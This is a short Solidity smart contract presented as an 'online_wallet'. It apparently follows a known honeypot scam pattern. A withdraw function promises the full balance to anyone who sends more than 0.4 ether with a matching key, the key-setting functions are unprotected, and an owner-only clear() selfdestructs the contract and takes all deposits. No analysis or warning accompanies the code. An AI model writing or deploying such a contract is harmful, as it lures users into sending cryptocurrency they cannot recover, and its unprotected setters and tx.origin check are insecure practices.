1 pragma solidity ^0.4.25;
2 
3 contract online_wallet
4 {
5     bytes32 keyHash;
6     address owner;
7     bytes32 wallet_id = 0xd19b73975417d4690cb86df91986bfdb77beaba872336b69e625f7eb27a18889;
8 
9     constructor() public {
10         owner = msg.sender;
11     }
12 
13     function withdraw(string key) public payable
14     {
15         require(msg.sender == tx.origin);
16         if(keyHash == keccak256(abi.encodePacked(key))) {
17             if(msg.value > 0.4 ether) {
18                 msg.sender.transfer(address(this).balance);
19             }
20         }
21     }
22 
23     function setup_key(string key) public
24     {
25         if (keyHash == 0x0) {
26             keyHash = keccak256(abi.encodePacked(key));
27         }
28     }
29 
30     function update_new_hash(bytes32 new_hash) public
31     {
32         if (keyHash == 0x0) {
33             keyHash = new_hash;
34         }
35     }
36 
37     function clear() public
38     {
39         require(msg.sender == owner);
40         selfdestruct(owner);
41     }
42 
43     function get_id() public view returns(bytes32){
44         return wallet_id;
45     }
46 
47     function () public payable {
48     }
49 }